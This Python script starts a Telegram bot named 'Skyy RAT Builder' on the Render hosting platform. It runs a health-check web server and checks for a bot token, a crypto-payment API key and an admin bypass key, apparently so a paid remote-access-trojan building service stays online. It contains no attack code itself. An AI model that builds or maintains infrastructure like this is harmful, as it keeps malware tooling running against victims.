#!/usr/bin/env python3
"""
Render startup script for Skyy RAT Builder
"""

import os
import sys
import asyncio
import logging
from aiohttp import web
import threading

# Add current directory to Python path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

try:
    from builder_bot import main
except ImportError as e:
    logging.error(f"Failed to import builder_bot: {e}")
    logging.error("Make sure all dependencies are installed correctly")
    sys.exit(1)

async def health_check(request):
    """Health check endpoint for Render"""
    return web.json_response({
        "status": "healthy",
        "service": "Skyy RAT Builder",
        "version": "1.0"
    })

async def start_web_server():
    """Start web server for Render health checks"""
    app = web.Application()
    app.router.add_get('/', health_check)
    app.router.add_get('/health', health_check)

    port = int(os.getenv('PORT', 10000))
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    logging.info(f"Web server started on port {port}")
    return runner

if __name__ == "__main__":
    # Configure logging for production
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    
    # Validate environment variables
    required_vars = ['BUILDER_BOT_TOKEN', 'NOWPAYMENTS_API_KEY', 'ADMIN_BYPASS_KEY']
    missing_vars = [var for var in required_vars if not os.getenv(var)]

    if missing_vars:
        logging.error(f"Missing environment variables: {missing_vars}")
        exit(1)

    # Check if admin key is still default
    admin_key = os.getenv('ADMIN_BYPASS_KEY')
    if admin_key == 'DEFAULT_KEY_CHANGE_ME':
        logging.error("ADMIN_BYPASS_KEY is still set to default value. Please change it!")
        exit(1)
    
    logging.info("Starting Skyy RAT Builder Bot on Render...")

    async def run_services():
        """Run both web server and Telegram bot"""
        try:
            # Start web server for Render
            web_runner = await start_web_server()

            # Start Telegram bot
            await main()

        except Exception as e:
            logging.error(f"Fatal error: {e}")
            raise

    try:
        asyncio.run(run_services())
    except Exception as e:
        logging.error(f"Fatal error: {e}")
        exit(1)
